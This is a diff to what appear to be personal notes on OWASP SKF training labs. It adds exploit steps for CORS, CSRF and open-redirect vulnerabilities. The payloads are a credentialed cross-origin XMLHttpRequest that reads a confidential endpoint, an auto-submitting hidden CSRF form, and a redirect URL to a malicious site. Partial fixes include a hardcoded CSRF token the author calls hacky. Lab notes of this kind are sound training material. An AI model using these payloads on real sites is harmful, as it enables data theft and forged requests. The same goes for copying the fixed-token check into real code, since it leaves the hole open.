@@ -18,6 +18,19 @@ Origin:blabla.nl
 
 connect to docker and start the evil application:
 python3 evil_server.py
+
+edit evil.html and add this script:
+```<script>
+
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','http://<ip>:5000/confidential', true);
+req.withCredentials = true;
+req.send();
+function reqListener(){
+document.getElementById("cors").innerHTML= req.responseText;
+}
+</script>```
 ##Fix
 TODO
 
@@ -73,14 +86,28 @@ TODO
 #Cross-site-request-forgery
 ##Preparation
 docker pull blabla1337/owasp-skf-lab:cross-site-request-forgery
-docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:cross-site-request-forgery
+docker run -ti -p <ip>:5000:5000 -p <ip>:1337:1337 blabla1337/owasp-skf-lab:cross-site-request-forgery
+as with CORS, also start the evil server here
 ##Exploit
-TODO
+make sure your evil server evil.html file includes the following script:
+```<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='http://<ip>:5000/update' target="csrf-frame" id="csrf-form">
+  <input type='hidden' name='color' value='Hackzord!'>
+  <input type='submit' value='submit'>                                                
+</form>                                              
+<script>document.getElementById("csrf-form").submit()</script>```
+This overwrites the color value. When you refresh the normal application you can see the damage.
 ##Fix
-TODO
+add hidden input field:
+```<input type="hidden" name="CSRFToken"
+value="OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==">```
+and in the application check for the value:
+```if not request.form['CSRFToken']=="OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==":^M
+        return render_template('index.html')```
+Very hacky example of course, this should not be one fixed value.
 
 
-#Topic
+#Open redirect
 ##Preparation
 docker pull blabla1337/owasp-skf-lab:url-redirect
 docker pull blabla1337/owasp-skf-lab:url-redirect-hard
@@ -88,11 +115,20 @@ docker pull blabla1337/owasp-skf-lab:url-redirect-harder
 docker pull blabla1337/owasp-skf-lab:url-redirect-harder2
 docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:url-redirect-hard
 ##Exploit
+<ip>:5000/redirect?newurl=www.malicioussite.nl
 ##Fix
+TODO
+```def redirector():
+    landing_page = request.args.get('newurl')
+    return redirect(landing_page, 302)```
+whitelist specific redirects that are allowed
 
-#Topic
+
+#IDOR
 ##Preparation
 docker pull blabla1337/owasp-skf-lab:
 docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:
 ##Exploit
+TODO
 ##Fix
+TODO
